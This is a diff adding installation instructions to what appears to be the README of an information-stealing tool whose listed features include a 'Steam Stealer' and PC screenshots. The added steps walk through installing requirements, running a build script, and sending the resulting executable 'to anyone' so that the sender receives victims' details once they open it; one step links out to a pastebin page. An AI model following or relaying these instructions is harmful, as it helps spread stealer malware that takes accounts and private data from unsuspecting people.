@@ -31,3 +31,20 @@
 - ⛈️ Steam Stealer
 - 📸 PC Screenshot
 - 🌟 More? **Leave a Star** and suggest!
+
+# Installation
+- Press the green code button and download
+- [Extract](https://pastebin.com/Gz0z26Em) in a convenient location (I prefer to make a new folder and extract in there)
+- In the location you saved it in copy the C:// address at the top.
+- Open comand prompt (Find in windows search bar)
+```bash
+# Go to the address
+$ cd C://whatyoucopied
+
+# Install requirements (If it dosen't work do pip install pip, then try again)
+$ pip install -r requirements.txt
+```
+- Open `install_python.bat` if you don't have python installed.
+- Open `build.bat`
+- Follow instructions and send your exe to anyone. Once they open it, you will recieve details.
+- Leave a star!
